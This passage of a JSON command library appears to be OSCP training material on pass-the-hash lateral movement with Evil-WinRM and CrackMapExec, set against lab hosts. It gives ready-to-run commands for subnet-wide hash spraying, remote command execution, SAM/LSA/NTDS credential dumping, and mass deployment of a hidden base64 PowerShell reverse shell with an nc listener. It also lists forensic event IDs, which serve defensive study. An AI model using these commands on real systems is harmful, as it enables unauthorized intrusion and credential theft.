Invoke-Mimikatz\n```\n\nMenu system:\n```\n*Evil-WinRM* PS> menu\n```\nProvides shortcuts for common tasks.\n\n2014 UAC REMOTE RESTRICTIONS:\n- RID 500 Administrator: PTH works\n- Other local admins: PTH blocked by UAC (unless Remote Management Users)\n- Domain users with proper group membership: PTH works\n\nCOMPARISON TO OTHER TOOLS:\n- PSExec: SYSTEM shell, service creation, faster but noisier\n- WMIExec: Semi-interactive, fileless, slower\n- SMBExec: Semi-interactive, batch files, stealthy\n- Evil-WinRM: Interactive PowerShell, best UX, WinRM-specific\n\nWinRM advantage: Different protocol (not SMB) - may work when SMB blocked.\n\nVERIFICATION:\nTest WinRM availability and hash:\n```bash\n# Check WinRM ports\nnmap -p 5985,5986 -Pn -v 192.168.50.73\n\n# Test hash\ncrackmapexec winrm 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E\n```\n\nSSL/TLS SUPPORT:\nFor HTTPS (port 5986):\n```bash\nevil-winrm -i 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E -S\n```\n-S flag enables SSL (port 5986).\n\nNote: Self-signed certificates common - Evil-WinRM accepts by default.\n\nOBTAINING HASHES:\n- secretsdump.py: Remote SAM/LSA dump from Kali\n- Mimikatz: sekurlsa::logonpasswords on Windows\n- crackmapexec: --sam or --lsa flags\n\nTIME ESTIMATE:\n- Connection: 30-60 seconds\n- Interactive session: As long as needed\n- File transfers: Depends on size (typically fast)\n\nEXAM STRATEGY:\n1. Use Evil-WinRM for interactive post-exploitation when WinRM available\n2. Preferred over PSExec for user-friendly PowerShell environment\n3. Excellent for running PowerShell enumeration scripts (PowerUp, PowerView)\n4. Built-in upload/download saves time vs manual file transfer\n5. If connection fails, verify WinRM ports open and user in correct group\n\nCOMMON FAILURES:\n- Authorization error: User not in Administrators or Remote Management Users\n- Network unreachable: WinRM not enabled or firewall blocking ports\n- Hash format error: Remove colon prefix (use -H NTLM not -H :NTLM)\n- SSL error: Certificate issue - try without -S (use HTTP port 5985)\n\nMANUAL ALTERNATIVE:\nFrom compromised Windows host with PowerShell:\n```powershell\n$username = 'Administrator'\n$password = 'Password123!'\n$secureString = ConvertTo-SecureString $password -AsPlaintext -Force  \n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString\n$session = New-PSSession -ComputerName 192.168.50.73 -Credential $credential\nEnter-PSSession $session\n```\n(Note: PowerShell doesn't natively support hash-based auth - requires Mimikatz for PTH)\n\nFORENSIC ARTIFACTS:\n- Event ID 4624: Logon Type 3 (Network logon via WinRM)\n- Event ID 4672: Special privileges assigned\n- WinRM logs: Event IDs 6-169 (WinRM activity)\n- PowerShell logging: Event ID 4104 (script block logging if enabled)\n- Event ID 5156: Windows Filtering Platform connections (port 5985/5986)",
      "oscp_relevance": "high"
    },
    {
      "id": "pth-cme-spray",
      "name": "Pass-the-Hash - CrackMapExec Spray",
      "description": "Spray NTLM hash across multiple targets to find where it works",
      "command": "crackmapexec smb <TARGET_RANGE> -u <USER> -H <NTLM_HASH>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET_RANGE>",
          "description": "Target IP, range, or CIDR",
          "example": "192.168.50.0/24",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash",
          "example": "2892D26CDF84D7A70E2EB3B9F05C425E",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-hash",
        "crackmapexec",
        "cme",
        "lateral-movement",
        "active-directory",
        "kali",
        "spraying",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "pth-impacket-psexec"
      ],
      "next_steps": [
        "pth-cme-exec  # Execute commands on pwned systems",
        "pth-impacket-psexec  # Establish interactive shell on high-value targets",
        "secretsdump-impacket  # Extract credentials from all compromised systems"
      ],
      "flag_explanations": {
        "-u <USER>": "Username to test",
        "-H <NTLM_HASH>": "NTLM hash for authentication",
        "-x '<CMD>'": "Execute cmd.exe command on pwned hosts",
        "-X '<CMD>'": "Execute PowerShell command on pwned hosts",
        "--sam": "Dump SAM hashes on pwned hosts",
        "--lsa": "Dump LSA secrets on pwned hosts",
        "--local-auth": "Test local authentication instead of domain"
      },
      "success_indicators": [
        "[+] <TARGET> (Pwn3d!)",
        "STATUS_SUCCESS",
        "Administrator rights confirmed"
      ],
      "failure_indicators": [
        "[-] Authentication failed",
        "STATUS_LOGON_FAILURE",
        "[-] Connection error"
      ],
      "troubleshooting": {
        "Many failures expected": "Hash may only work on specific systems - look for Pwn3d!",
        "Timeout on subnet scan": "Reduce range or increase timeout: --timeout 5",
        "UAC blocking": "Local admin hashes blocked except RID 500 Administrator",
        "No Pwn3d found": "Try domain accounts or different hash"
      },
      "notes": "OSCP TRAINING MATERIAL - PASS-THE-HASH SPRAYING WITH CRACKMAPEXEC:\n\nWHAT IS PTH SPRAYING: Rapidly testing a single NTLM hash across multiple targets to identify all systems where the compromised credential grants administrative access. Efficient technique for discovering credential reuse.\n\nWHY SPRAY HASHES:\n- Same local administrator password often reused across multiple machines\n- Domain admin hash works on all domain-joined systems\n- Quick way to identify lateral movement opportunities\n- Faster than testing each system individually\n\nCRACKMAPEXEC (CME) ADVANTAGES:\n- Multi-threaded: Tests many hosts simultaneously\n- CIDR support: 192.168.50.0/24 tests entire subnet\n- Clear indicators: [+] Pwn3d! shows admin access\n- Protocol flexibility: SMB, WinRM, MSSQL, SSH\n- Built-in post-exploitation: --sam, --lsa, -x, -X\n\nPWNED INDICATOR:\n```\nSMB    192.168.50.73    445    FILES04    [+] CORP\\Administrator:2892... (Pwn3d!)\n```\n(Pwn3d!) = Hash grants local administrator access on this system.\n\nNo (Pwn3d!) but [+] = Valid credentials but not admin:\n```\nSMB    192.168.50.75    445    WEB01      [+] CORP\\jen:369def...\n```\nAuthentication succeeded but user lacks admin privileges.\n\nTHREE PREREQUISITES:\n1. Valid NTLM hash from compromised user\n2. SMB port 445 accessible on targets\n3. No network segmentation blocking attacker â†’ targets\n\n2014 UAC REMOTE RESTRICTIONS (CRITICAL):\n- RID 500 Administrator hash: Works across all systems\n- Other local admin hashes: BLOCKED by UAC on Windows 7+ (except domain accounts)\n- Domain user hashes: Work if user is local admin on target\n\nThis is why training scenarios typically use:\n- Built-in Administrator account (RID 500), OR\n- Domain user accounts with local admin rights\n\nHASH FORMAT:\n- CrackMapExec: -H NTLM_HASH (no colon prefix)\n- Example: -H 2892D26CDF84D7A70E2EB3B9F05C425E\n- Accepts 32 hex characters\n\nTARGET SPECIFICATION:\nMultiple formats supported:\n- Single IP: 192.168.50.73\n- IP range: 192.168.50.1-192.168.50.254\n- CIDR notation: 192.168.50.0/24\n- Hostname: files04.corp.com\n- IP list file: -t targets.txt\n\nEXECUTION WORKFLOW:\n1. CME connects to each target via SMB (port 445)\n2. Attempts NTLM authentication with provided hash\n3. Tests if authenticated user has admin privileges\n4. Displays result: [+] or [-] with (Pwn3d!) if admin\n5. Continues to next target\n\nSPEED AND THREADING:\n- Default threads: Automatic (typically 100)\n- Custom threads: --threads 50\n- /24 subnet: 1-2 minutes typical\n- /16 subnet: 10-20 minutes (6553 6 hosts)\n\nCOMMON USE CASES:\nScenario 1: Local admin password reuse\n```bash\ncrackmapexec smb 192.168.50.0/24 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E\n```\nFinds all systems using same local Administrator password.\n\nScenario 2: Domain user with local admin rights\n```bash\ncrackmapexec smb 192.168.50.0/24 -u jen -H 369def79d8372408bf6e93364cc93075 -d corp.com\n```\nFinds all systems where jen is local admin.\n\nScenario 3: Domain admin access\n```bash\ncrackmapexec smb 192.168.50.0/24 -u admin_da -H <HASH> -d corp.com\n```\nDomain admin hash typically works on ALL domain-joined systems.\n\nLOCAL VS DOMAIN AUTHENTICATION:\n- Default: Domain authentication (if domain detected)\n- Force local: --local-auth flag\n- Explicit domain: -d corp.com\n\nAUTHENTICATION ONLY (NO EXPLOITATION):\nCME spray tests authentication without executing commands:\n- Fast: No command execution overhead\n- Stealthy: Minimal Event Log entries\n- Safe: Doesn't trigger command execution alerts\n\nPOST-EXPLOITATION OPTIONS:\nAfter identifying pwned systems:\n```bash\n# Execute command on all pwned hosts\ncrackmapexec smb 192.168.50.0/24 -u Administrator -H <HASH> -x whoami\n\n# Dump SAM hashes from all pwned hosts  \ncrackmapexec smb 192.168.50.0/24 -u Administrator -H <HASH> --sam\n\n# Dump LSA secrets\ncrackmapexec smb 192.168.50.0/24 -u Administrator -H <HASH> --lsa\n```\n\nOUTPUT INTERPRETATION:\n```\n[+] Successful authentication\n[-] Failed authentication\n[*] Informational message\n(Pwn3d!) Local administrator access confirmed\n```\n\nVERIFICATION:\nBefore spraying, test hash on known target:\n```bash\ncrackmapexec smb 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E\n```\nConfirm [+] before spraying subnet.\n\nTIME ESTIMATE:\n- /24 subnet (254 hosts): 1-2 minutes\n- Single host verification: <10 seconds\n- /16 subnet: Not recommended for exam (too slow)\n\nEXAM STRATEGY:\n1. Obtain hash via secretsdump/Mimikatz\n2. Verify hash on source system\n3. Spray across lab subnet to find reuse\n4. Prioritize high-value targets from results\n5. Use --sam to extract more hashes from pwned systems\n6. Repeat spray with newly obtained hashes\n\nCOMMON FAILURES:\n- Many [-] expected: Hash won't work everywhere\n- Timeout errors: Increase --timeout 5\n- No Pwn3d found: Try --local-auth or different hash\n- Connection refused: Firewall blocking port 445\n\nFORENSIC ARTIFACTS (PER TARGET):\n- Event ID 4624: Logon Type 3 (Network logon attempt)\n- Event ID 4625: Failed logon (if hash invalid on that system)\n- Event ID 4672: Special privileges (if admin access)\n- Minimal footprint compared to command execution\n\nDIFFERENCE FROM PASSWORD SPRAYING:\n- Password spray: One password, many users (horizontal)\n- Hash spray: One hash, many systems (lateral)\n- PTH spray finds where credential is reused across infrastructure",
      "oscp_relevance": "high"
    },
    {
      "id": "pth-cme-exec",
      "name": "Pass-the-Hash - CrackMapExec Execute",
      "description": "Execute commands on remote system using NTLM hash with CrackMapExec",
      "command": "crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH> -x '<COMMAND>'",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash",
          "example": "2892D26CDF84D7A70E2EB3B9F05C425E",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "Command to execute (cmd.exe syntax)",
          "example": "whoami",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-hash",
        "crackmapexec",
        "cme",
        "lateral-movement",
        "active-directory",
        "kali",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "pth-impacket-psexec"
      ],
      "next_steps": [
        "secretsdump-impacket  # Extract credentials using --sam or --lsa",
        "pth-impacket-psexec  # Upgrade to full interactive shell if needed",
        "windows-enum-system  # Perform system enumeration for privilege escalation"
      ],
      "flag_explanations": {
        "-x '<CMD>'": "Execute cmd.exe command",
        "-X '<CMD>'": "Execute PowerShell command",
        "--exec-method": "Specify method: wmiexec (default), smbexec, atexec, mmcexec",
        "--no-output": "Don't retrieve command output (faster)"
      },
      "success_indicators": [
        "[+] Executing command",
        "[*] Executed command",
        "Command output displayed"
      ],
      "failure_indicators": [
        "[-] Authentication failed",
        "STATUS_ACCESS_DENIED"
      ],
      "troubleshooting": {
        "No output": "Try different --exec-method: wmiexec, smbexec, atexec",
        "Authentication failed": "Verify hash works: crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>",
        "Command syntax error": "Use -x for cmd.exe, -X for PowerShell"
      },
      "notes": "OSCP TRAINING MATERIAL - PASS-THE-HASH COMMAND EXECUTION WITH CRACKMAPEXEC:\n\nWHAT IS CME EXEC: CrackMapExec wrapper combining pass-the-hash authentication with remote command execution in a single operation. Efficient for quick enumeration and exploitation.\n\nWHY USE CME EXEC:\n- One-liner: Authentication + command in single command\n- Multiple execution methods: Choose stealth vs speed\n- Quick enumeration: Faster than establishing full shell\n- Mass execution: Run same command on multiple targets\n- Built-in credential dumping: --sam, --lsa flags\n\nTHREE PREREQUISITES:\n1. Valid NTLM hash from compromised user\n2. SMB/WMI access to target (ports 445/135)\n3. User must be local administrator\n\nEXECUTION METHODS:\nCME supports multiple backend methods:\n- wmiexec (default): Uses WMI, fileless, stealthy, no service creation\n- smbexec: Uses SMB, batch files, fileless, temporary service\n- atexec: Uses Task Scheduler, scheduled task creation\n- mmcexec: Uses MMC20.Application COM object\n\nSelect method:\n```bash\ncrackmapexec smb 192.168.50.73 -u Administrator -H <HASH> -x whoami --exec-method wmiexec\n```\n\nCOMMAND TYPES:\n- -x 'COMMAND': Execute cmd.exe command\n- -X 'COMMAND': Execute PowerShell command\n\nExamples:\n```bash\n# CMD command\ncrackmapexec smb 192.168.50.73 -u Administrator -H <HASH> -x 'whoami'\n\n# PowerShell command\ncrackmapexec smb 192.168.50.73 -u Administrator -H <HASH> -X 'Get-Process'\n```\n\nHASH FORMAT:\n- CrackMapExec: -H NTLM_HASH (no colon)\n- Example: -H 2892D26CDF84D7A70E2EB3B9F05C425E\n\n2014 UAC REMOTE RESTRICTIONS:\n- RID 500 Administrator: Works\n- Other local admins: Blocked by UAC\n- Domain users with local admin: Works\n\nCOMMON ENUMERATION COMMANDS:\nQuick wins for OSCP:\n```bash\n# System information\ncrackmapexec smb <TARGET> -u <USER> -H <HASH> -x 'systeminfo'\n\n# Current user\ncrackmapexec smb <TARGET> -u <USER> -H <HASH> -x 'whoami /all'\n\n# Network information\ncrackmapexec smb <TARGET> -u <USER> -H <HASH> -x 'ipconfig /all'\n\n# Running processes\ncrackmapexec smb <TARGET> -u <USER> -H <HASH> -X 'Get-Process'\n\n# Installed software\ncrackmapexec smb <TARGET> -u <USER> -H <HASH> -X 'Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'\n```\n\nCREDENTIAL DUMPING:\nBuilt-in flags for credential extraction:\n```bash\n# Dump SAM hashes\ncrackmapexec smb 192.168.50.73 -u Administrator -H <HASH> --sam\n\n# Dump LSA secrets\ncrackmapexec smb 192.168.50.73 -u Administrator -H <HASH> --lsa\n\n# Dump NTDS.dit (Domain Controller)\ncrackmapexec smb 192.168.50.100 -u Administrator -H <HASH> --ntds\n```\n\nOUTPUT RETRIEVAL:\nCME displays command output directly:\n```\nSMB    192.168.50.73    445    FILES04    [+] Executed command\nSMB    192.168.50.73    445    FILES04    files04\\administrator\n```\n\nNO OUTPUT OPTION:\nFor speed without output retrieval:\n```bash\ncrackmapexec smb <TARGET> -u <USER> -H <HASH> -x 'command' --no-output\n```\nUseful for mass deployment (reverse shells, etc.).\n\nMULTIPLE TARGETS:\nExecute on multiple systems:\n```bash\n# CIDR range\ncrackmapexec smb 192.168.50.0/24 -u Administrator -H <HASH> -x 'hostname'\n\n# Target list\ncrackmapexec smb -t targets.txt -u Administrator -H <HASH> -x 'whoami'\n```\n\nCOMPARISON TO OTHER TOOLS:\n- impacket-psexec: Interactive shell, SYSTEM context, slower\n- impacket-wmiexec: Semi-interactive shell, user context, fileless\n- CME exec: Single command, fast, multiple methods\n\nWhen to use CME exec:\n- Quick enumeration: Get system info fast\n- Testing access: Verify hash works\n- Mass deployment: Deploy to multiple targets\n- Credential dumping: --sam/--lsa faster than manual\n\nWhen to use full shell (PSExec/WMIExec):\n- Interactive exploration needed\n- Complex multi-step tasks\n- Manual enumeration required\n- File manipulation needed\n\nREVERSE SHELL DEPLOYMENT:\nCME can deploy reverse shells:\n```bash\n# PowerShell reverse shell (base64)\ncrackmapexec smb <TARGET> -u <USER> -H <HASH> -X 'powershell -nop -w hidden -e <BASE64_PAYLOAD>'\n```\n\nSet up listener first:\n```bash\nnc -lvnp 443\n```\n\nEXECUTION METHOD COMPARISON:\nwmiexec (default):\n- Fileless, no service creation\n- Slower per command\n- Stealthy\n- Recommended for exam\n\nsmbexec:\n- Batch files, temporary service\n- Faster than wmiexec\n- More artifacts\n\natexec:\n- Uses Task Scheduler\n- Creates scheduled task\n- Task visible in Task Scheduler\n- Leaves Event ID 4698\n\nVERIFICATION:\nTest before exploitation:\n```bash\ncrackmapexec smb 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E\n```\nLook for (Pwn3d!) before -x commands.\n\nTIME ESTIMATE:\n- Single command: 5-10 seconds\n- Multiple targets: 1-2 minutes for /24\n- Credential dumping (--sam): 10-30 seconds\n\nEXAM STRATEGY:\n1. Verify hash with CME (no -x)\n2. Quick enumeration: systeminfo, whoami, ipconfig\n3. Credential dumping: --sam for local hashes\n4. If complex tasks needed, switch to PSExec/WMIExec full shell\n5. For mass deployment, use CME -x with reverse shell payload\n\nCOMMON FAILURES:\n- Authentication failed: Hash invalid or user not admin\n- No output: Try different --exec-method\n- STATUS_ACCESS_DENIED: User lacks admin privileges\n- Execution method fails: Switch method (wmiexec â†’ smbexec)\n\nFORENSIC ARTIFACTS:\n- Event ID 4624: Network logon\n- Event ID 4672: Special privileges\n- WMI logs: If using wmiexec method\n- Service creation: If using smbexec method\n- Task creation (Event 4698): If using atexec\n- Process creation (Event 4688): For spawned processes",
      "oscp_relevance": "high"
    },
    {
      "id": "pth-verify-hash-format",
      "name": "Pass-the-Hash - Verify Hash Format",
      "description": "Test if NTLM hash is valid format and works for authentication before exploitation",
      "command": "crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash to test",
          "example": "2892D26CDF84D7A70E2EB3B9F05C425E",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-hash",
        "verification",
        "crackmapexec",
        "enumeration",
        "active-directory",
        "kali"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "pth-impacket-psexec  # If Pwn3d!, establish full shell for exploitation",
        "pth-cme-spray  # If valid, spray hash across subnet to find reuse",
        "secretsdump-impacket  # Extract more credentials if admin access confirmed"
      ],
      "flag_explanations": {
        "-u <USER>": "Username to test",
        "-H <NTLM_HASH>": "NTLM hash (32 hex characters)",
        "--local-auth": "Test local authentication instead of domain"
      },
      "success_indicators": [
        "[+] <DOMAIN>\\<USER>:<NTLM_HASH> (Pwn3d!)",
        "Administrator access confirmed"
      ],
      "failure_indicators": [
        "[-] <USER>:<NTLM_HASH> STATUS_LOGON_FAILURE",
        "Invalid hash format"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Invalid hash or username. Verify hash extraction",
        "+ without Pwn3d": "User authenticated but not local admin",
        "Invalid hash format": "Ensure 32 hex characters, no spaces/colons/prefixes",
        "Hash from wrong user": "Match hash to username - secretsdump output shows user:hash pairs"
      },
      "notes": "OSCP TRAINING MATERIAL - HASH VERIFICATION BEFORE EXPLOITATION:\n\nWHY VERIFY FIRST: Always test hash validity before attempting lateral movement. Saves exam time by catching errors early (invalid format, wrong user, UAC restrictions, etc.).\n\nWHAT IS HASH VERIFICATION: Using CrackMapExec to test if NTLM hash is valid format and grants access before committing to full exploitation tool (PSExec, WMIExec, etc.).\n\nBEST PRACTICE WORKFLOW:\n1. Obtain NTLM hash (secretsdump, Mimikatz, etc.)\n2. VERIFY with crackmapexec (fast, <10 seconds)\n3. Check for (Pwn3d!) indicator\n4. If success, proceed with lateral movement tool\n5. If failure, troubleshoot hash/credentials\n\nNTLM HASH FORMAT:\n- Length: 32 hexadecimal characters (128 bits)\n- Character set: 0-9, A-F (case insensitive)\n- Example: 2892D26CDF84D7A70E2EB3B9F05C425E\n- No colons, spaces, or special characters\n\nCOMMON HASH FORMATS IN DUMPS:\nSecretsdump output format:\n```\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:2892D26CDF84D7A70E2EB3B9F05C425E:::\n```\nFields: USERNAME:RID:LM_HASH:NTLM_HASH:::\n\nExtract NTLM hash (4th field after 3rd colon):\n- LM hash: aad3b435b51404eeaad3b435b51404ee (disabled/empty)\n- NTLM hash: 2892D26CDF84D7A70E2EB3B9F05C425E (use this)\n\nLM vs NTLM:\n- LM hash: Legacy (pre-Windows Vista), weak, often disabled\n- NTLM hash: Modern (Windows Vista+), 128-bit MD4, used for authentication\n- Empty LM: aad3b435b51404eeaad3b435b51404ee indicates LM disabled\n- Only NTLM needed for pass-the-hash on modern systems\n\nMimikatz output format:\n```\nUsername : Administrator\nDomain   : CORP\nNTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e\n```\nExtract from \"NTLM\" line.\n\nCrackMapExec SAM dump format:\n```\nSMB    192.168.50.73    445    FILES04    Administrator:500:aad3...:2892...:::\n```\nSame format as secretsdump - use 4th field.\n\nOUTPUT INTERPRETATION:\nSuccess with admin access:\n```\nSMB    192.168.50.73    445    FILES04    [+] CORP\\Administrator:2892D... (Pwn3d!)\n```\n(Pwn3d!) = Hash grants local administrator access.\n\nSuccess without admin:\n```\nSMB    192.168.50.75    445    WEB01      [+] CORP\\jen:369def...\n```\n[+] without (Pwn3d!) = Authentication succeeded but user lacks admin privileges.\n\nFailure:\n```\nSMB    192.168.50.76    445    DB01       [-] CORP\\Administrator:2892D... STATUS_LOGON_FAILURE\n```\n[-] = Hash invalid, username wrong, or account disabled.\n\nVERIFICATION COMMAND:\n```bash\ncrackmapexec smb 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E\n```\n\nCRACKMAPEXEC ADVANTAGES:\n- Fast: <10 seconds per host\n- Clear output: (Pwn3d!) indicator obvious\n- Authentication only: No command execution (stealthy)\n- Multi-protocol: Test SMB, WinRM, MSSQL, etc.\n- Batch testing: Test multiple hosts/hashes quickly\n\nCOMMON VERIFICATION ERRORS:\nInvalid hash format:\n```\n[-] Invalid hash format\n```\nFix: Ensure 32 hex characters, no spaces/colons.\n\nSTATUS_LOGON_FAILURE:\n```\n[-] STATUS_LOGON_FAILURE\n```\nCauses:\n- Hash extracted incorrectly (wrong field)\n- Username doesn't match hash\n- Account disabled\n- Hash is LM not NTLM\n\nNo (Pwn3d!) despite [+]:\n```\n[+] CORP\\jen:369def... \n```\nAuthentication succeeded but user not local admin.\n\n2014 UAC RESTRICTIONS:\nLocal admin hash blocked:\n```\n[+] CORP\\localadmin:abc123... \n```\nNo (Pwn3d!) because UAC blocks non-RID-500 local admins.\n\nWorkaround: Use RID 500 Administrator or domain user.\n\nHASH EXTRACTION FROM SECRETSDUMP:\nFull command:\n```bash\nimpacket-secretsdump CORP/Administrator:Password123!@192.168.50.73\n```\n\nOutput:\n```\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:2892D26CDF84D7A70E2EB3B9F05C425E:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n```\n\nExtract:\n- Administrator hash: 2892D26CDF84D7A70E2EB3B9F05C425E\n- Guest hash: 31d6cfe0d16ae931b73c59d7e0c089c0 (empty password)\n\nUSER:HASH MATCHING:\nCritical: Username must match the user whose hash you have.\n\nCorrect:\n```bash\ncrackmapexec smb <TARGET> -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E\n```\n\nIncorrect:\n```bash\ncrackmapexec smb <TARGET> -u jen -H 2892D26CDF84D7A70E2EB3B9F05C425E\n```\nHash belongs to Administrator, not jen.\n\nDOMAIN VS LOCAL AUTHENTICATION:\nDefault: CME attempts domain authentication.\n\nForce local:\n```bash\ncrackmapexec smb <TARGET> -u Administrator -H <HASH> --local-auth\n```\n\nExplicit domain:\n```bash\ncrackmapexec smb <TARGET> -u Administrator -H <HASH> -d CORP\n```\n\nVERIFY MULTIPLE HASHES:\nTest all extracted hashes:\n```bash\nfor hash in hash1 hash2 hash3; do\n  crackmapexec smb 192.168.50.73 -u Administrator -H $hash\ndone\n```\n\nFind which hash works.\n\nTIME ESTIMATE:\n- Single verification: <10 seconds\n- Multiple hashes: <1 minute\n- Subnet spray: 1-2 minutes\n\nEXAM STRATEGY:\n1. Extract all hashes from compromised system (secretsdump)\n2. Verify EACH hash with crackmapexec before exploitation\n3. Look for (Pwn3d!) - indicates admin access\n4. If hash fails, troubleshoot format before wasting time on full tools\n5. Once verified, proceed confidently with PSExec/WMIExec\n\nDECISION TREE:\n- (Pwn3d!): Proceed with lateral movement (PSExec, WMIExec, etc.)\n- [+] without Pwn3d: User valid but not admin (try different user)\n- [-]: Hash/username invalid (re-extract hash, verify username)\n- UAC blocked: Switch to RID 500 or domain user\n\nALTERNATIVE VERIFICATION:\nTest with Impacket directly (slower):\n```bash\nimpacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73\n```\nBut CrackMapExec faster for verification only.\n\nFORENSIC ARTIFACTS (VERIFICATION):\nMinimal footprint:\n- Event ID 4624: Network logon attempt (Type 3)\n- Event ID 4625: Failed logon (if hash invalid)\n- No command execution artifacts\n- Stealthy: Authentication test only\n\nVERIFICATION SAVES TIME:\nWithout verification:\n1. Attempt PSExec with invalid hash â†’ 2 minutes wasted\n2. Troubleshoot why PSExec failed â†’ 5 minutes wasted\n3. Re-extract hash â†’ 2 minutes\n4. Retry PSExec â†’ 2 minutes\nTotal: 11 minutes\n\nWith verification:\n1. Verify hash with CME â†’ 10 seconds\n2. Identify problem immediately â†’ 1 minute fix\n3. PSExec with correct hash â†’ 2 minutes\nTotal: 3 minutes\n\nSaved: 8 minutes (critical in 24-hour exam)",
      "oscp_relevance": "medium"
    }
  ]
}